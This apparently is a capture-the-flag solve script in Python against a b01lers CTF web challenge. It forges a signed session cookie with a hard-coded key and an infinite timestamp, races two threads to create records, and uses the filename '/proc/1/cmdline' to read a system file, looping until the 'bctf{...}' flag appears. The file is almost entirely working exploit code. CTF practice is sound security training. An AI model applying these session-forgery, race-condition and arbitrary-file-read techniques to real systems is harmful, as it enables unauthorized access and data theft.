import base64
import json
import re
import threading
import time

import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


import requests
from itsdangerous import TimestampSigner

URL = "https://egg-cc559840dea95373.b01lersc.tf"


def create_egg(session: requests.Session, name: str, filename: str):
    session.post(
        f"{URL}/eggs",
        json={"name": name, "filename": filename},
        allow_redirects=False,
        verify=False,
    )


def update_timestamp(session: requests.Session):
    cookie = session.cookies.get("session")  # pyright: ignore
    user_id = json.loads(base64.b64decode(cookie.split(".")[0]))  # pyright: ignore
    s = TimestampSigner("6767676767676767")
    data = base64.b64encode(
        json.dumps({"player_id": user_id["player_id"], "session_timestamp": -1e309}).encode("utf-8")
    )
    cookie = s.sign(data).decode()
    session.cookies.clear()
    session.cookies.set("session", cookie)


result = ""
trys = 0
while "bctf" not in result:
    trys += 1
    print(f"Try {trys}")
    session1 = requests.Session()
    session2 = requests.Session()

    session1.post(f"{URL}/login", data={"username": "a"}, verify=False)
    session2.post(f"{URL}/login", data={"username": "a"}, verify=False)
    update_timestamp(session1)
    update_timestamp(session2)

    t1 = threading.Thread(target=create_egg, args=(session1, "a" * 81, "/proc/1/cmdline"))
    t2 = threading.Thread(target=create_egg, args=(session2, "a", "asciiart"))
    t2.start()
    t1.start()
    t1.join()
    t2.join()

    INF_HASH = "e99270c4fa9f6ea70486c8a763d7519b57ce1a4a9a0c6e0ca3bec74a82e38c24"
    session1.post(f"{URL}/eggs/{INF_HASH}/hatch", json={"art_index": 0}, verify=False)
    result = session1.get(f"{URL}", verify=False).text
pattern = re.compile(r"bctf\{.*?\}")
for line in result.splitlines():
    m = pattern.search(line)
    if m:
        print(m.group(0))
        break
